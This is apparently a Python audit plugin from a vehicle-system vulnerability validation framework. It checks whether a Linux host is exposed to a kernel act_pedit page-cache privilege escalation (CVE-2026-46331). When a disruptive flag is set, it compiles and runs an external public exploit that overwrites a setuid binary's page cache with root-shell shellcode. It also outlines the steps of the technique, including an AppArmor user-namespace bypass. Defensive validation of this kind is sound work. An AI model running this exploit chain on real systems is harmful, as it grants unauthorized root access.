#!/usr/bin/env python3
"""CVE-2026-46331 – net/sched act_pedit Partial-COW Page Cache Corruption: tcf_pedit_act() COW hint under-counts typed key runtime offsets → partial page cache write without COW → setuid binary page cache poisoning → root.

Public PoC source: https://github.com/sgkdev/packet_edit_meme
  Files: ['packet_edit_meme.c', 'Makefile', 'test_cve.c']
  Technique:
    1. Locate /bin/su or /usr/bin/su, read ELF entry point offset.
    2. unshare(CLONE_NEWUSER|CLONE_NEWNET) for CAP_NET_ADMIN in net namespace.
    3. Use tc filter + act_pedit primitive (api_fd_write) to overwrite target file page cache
       chunk-by-chunk with x86_64 shellcode (setuid(0)+setgid(0)+execve(/bin/sh)).
    4. execve(su_path) → root shell via polluted page cache.
    Ubuntu workaround: --ubuntu flag tries aa-exec trinity/chrome/flatpak profiles to bypass
    AppArmor userns restriction.
  Kernel range: 5.18 ≤ kernel < 7.1-rc7

Reference: https://cloud.tencent.com/announce/detail/2332
  PoC commit: 899ee91156e57784090c5565e4f31bd7dbffbc5a
"""
from __future__ import annotations

import re
import subprocess
import tempfile
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 54,
    "cve": "CVE-2026-46331",
    "year": 2026,
    "domain": "advanced",
    "vendor_product": "Linux kernel 5.18–7.1-rc6 (IVI/边缘 Linux 节点)",
    "component": "Linux kernel net/sched/act_pedit.c – tcf_pedit_act() COW range hint incomplete",
    "type": "本地权限提升 (LPE) → root / net/sched act_pedit Page Cache 写入",
    "summary": (
        "CVE-2026-46331 act_pedit: tcf_pedit_act() 在密钥循环前通过 tcfp_off_max_hint "
        "预计算 COW 范围，但该提示未考虑类型化密钥的运行时头部偏移，"
        "导致部分 page cache 写入未触发 COW，攻击者可从 userns CAP_NET_ADMIN "
        "精确覆盖 setuid 二进制 page cache entry → root shell。"
        "影响 Linux 5.18 ≤ k < 7.1-rc7。"
    ),
    "source_url": "https://github.com/sgkdev/packet_edit_meme",
    "requires_manual_review": True,
    "affected": [
        {
            "vendor": "Linux",
            "product": "Linux kernel",
            "versions": [
                {"version": "5.18", "status": "affected", "lessThan": "7.1-rc7"},
            ],
        }
    ],
}

POC_REPO = (
    Path(__file__).parent.parent.parent
    / "public_poc_sources/repos/sgkdev__packet_edit_meme"
)
POC_REPO_ALT = (
    Path(__file__).parent.parent.parent
    / "public_poc_sources/repos/Unclecheng-li__poc-lab"
    / "CVE-2026-46331 act_pedit/exploit"
)


def _check_version() -> dict:
    result: dict = {}
    try:
        r = subprocess.run(["uname", "-r"], capture_output=True, text=True, timeout=5)
        kver = r.stdout.strip()
        result["kernel_version"] = kver

        m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", kver)
        if m:
            major, minor = int(m.group(1)), int(m.group(2))
            vuln = (major == 5 and minor >= 18) or (major == 6) or (major == 7 and minor == 0)
            result["version_in_affected_range"] = vuln

        # Check act_pedit module
        lsmod = subprocess.run("lsmod", capture_output=True, text=True, timeout=5)
        result["act_pedit_loaded"] = "act_pedit" in lsmod.stdout

        # User namespace
        userns = Path("/proc/sys/user/max_user_namespaces")
        result["user_namespace_max"] = userns.read_text().strip() if userns.exists() else "unknown"
        result["user_namespace_enabled"] = result["user_namespace_max"] not in ("0", "unknown")

        # AppArmor userns (Ubuntu)
        aa = Path("/proc/sys/kernel/apparmor_restrict_unprivileged_userns")
        result["apparmor_userns_restricted"] = aa.read_text().strip() if aa.exists() else "0"

        # /bin/su / /usr/bin/su
        su_paths = ["/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su"]
        result["su_target"] = next((p for p in su_paths if Path(p).exists()), None)

    except Exception as exc:
        result["check_error"] = str(exc)
    return result


def _compile_and_run(allow_disruptive: bool, lab_cmd: str) -> dict:
    result: dict = {}

    # Find poc source
    poc_c = None
    for repo in [POC_REPO, POC_REPO_ALT]:
        candidate = repo / "packet_edit_meme.c"
        if candidate.exists():
            poc_c = candidate
            break

    if poc_c is None:
        result["poc_repo_missing"] = str(POC_REPO)
        result["detail"] = (
            "Clone https://github.com/sgkdev/packet_edit_meme into "
            "public_poc_sources/repos/sgkdev__packet_edit_meme. "
            "Build: make && ./packet_edit_meme "
            "(Ubuntu: ./packet_edit_meme --ubuntu)"
        )
        result["would_compile"] = "make"
        result["would_run"] = "./packet_edit_meme"
        return result

    if not allow_disruptive:
        result["would_compile"] = "make"
        result["would_run"] = "./packet_edit_meme"
        result["detail"] = (
            "Set allow_disruptive=true to compile and run act_pedit PoC. "
            "WARNING: Overwrites setuid binary page cache → root shell. Isolated VM required."
        )
        return result

    with tempfile.TemporaryDirectory() as tmpdir:
        import shutil
        for f in poc_c.parent.iterdir():
            if f.is_file():
                shutil.copy2(str(f), f"{tmpdir}/{f.name}")

        # Build
        makefile = Path(tmpdir) / "Makefile"
        if not makefile.exists():
            # Write minimal Makefile
            makefile.write_text(
                "all:\n"
                "\tgcc -O2 -Wall -o packet_edit_meme packet_edit_meme.c\n"
                "\tgcc -O2 -Wall -o test_cve test_cve.c 2>/dev/null || true\n"
            )

        r = subprocess.run(
            "make", shell=True, cwd=tmpdir, capture_output=True, text=True, timeout=60,
        )
        result["compile_rc"] = r.returncode
        result["compile_out"] = (r.stdout + r.stderr)[:400]
        if r.returncode != 0:
            result["detail"] = "Compile failed."
            return result

        # First run test_cve to validate primitive without full exploit
        tc = subprocess.run(
            "./test_cve 2>&1 | head -20; echo '---'; id",
            shell=True, cwd=tmpdir, capture_output=True, text=True, timeout=30,
        )
        result["test_cve_out"] = tc.stdout[:400]
        result["primitive_confirmed"] = "pass" in tc.stdout.lower() or tc.returncode == 0

        if result["primitive_confirmed"]:
            r2 = subprocess.run(
                f"./packet_edit_meme; {lab_cmd}",
                shell=True, cwd=tmpdir, capture_output=True, text=True, timeout=120,
            )
            result["run_rc"] = r2.returncode
            result["run_out"] = (r2.stdout + r2.stderr)[:600]
            result["exploited"] = (
                "uid=0" in r2.stdout
                or "root" in r2.stdout.lower()
            )
    return result


def _run_poc(plugin) -> dict:
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))
    # Never accept a client-provided local command. The fixed identity probe is
    # sufficient to record the post-exploit privilege level.
    lab_cmd = "id"

    evidence: dict = {
        "cve": "CVE-2026-46331",
        "poc_repo": str(POC_REPO),
        "poc_repo_present": any(
            (r / "packet_edit_meme.c").exists()
            for r in [POC_REPO, POC_REPO_ALT]
        ),
        "exploit_files": ["packet_edit_meme.c", "Makefile", "test_cve.c"],
        "technique": (
            "unshare NEWUSER+NEWNET → CAP_NET_ADMIN → tc filter + act_pedit (api_fd_write) "
            "→ tcf_pedit_act() COW hint miscount → partial page cache write bypasses COW "
            "→ ELF entry overwrite with setuid(0)+execve(/bin/sh) shellcode "
            "→ execve(su_path) → root (kernel 5.18≤k<7.1-rc7)."
        ),
        "ubuntu_bypass": "--ubuntu flag tries aa-exec trinity/chrome/flatpak AppArmor profile bypass",
        "reference": "https://cloud.tencent.com/announce/detail/2332",
        "fix_commit": "899ee91156e57784090c5565e4f31bd7dbffbc5a",
    }

    ver = _check_version()
    evidence.update(ver)
    exploit = _compile_and_run(allow_disruptive, lab_cmd)
    evidence.update(exploit)

    return {
        "vulnerable": evidence.get("exploited"),
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "https://github.com/sgkdev/packet_edit_meme",
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc54CVE202646331ActPeditPageCacheLpeAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "poc_lab_vehicle"
    meta_display_id = "POC-ADV-054"
    meta_poc_name = 'CVE-2026-46331 sched Privilege Escalation Active Validation'
    meta_cve_id = "CVE-2026-46331"
    meta_severity = "High"
    meta_protocol = "local"
    meta_target_os = ["linux"]
    meta_required_params = []
    meta_optional_params = ["allow_disruptive", "lab_command"]
    meta_profiles = ["advanced", "kernel", "pagecache", "netsched"]
    meta_source_url = "https://github.com/sgkdev/packet_edit_meme"
    meta_references       = ['https://github.com/sgkdev/packet_edit_meme']
    meta_attack_surface = (
        "本地非特权用户通过 net/sched act_pedit 不完整 COW 覆盖 setuid 二进制 page cache → root"
    )
    is_disruptive = True
    meta_destructive_level = "RootCompromise"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "54_Linux_Kernel_act_pedit_PageCache_LPE_Audit") if "VULN" in dir() else "54_Linux_Kernel_act_pedit_PageCache_LPE_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc54CVE202646331ActPeditPageCacheLpeAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
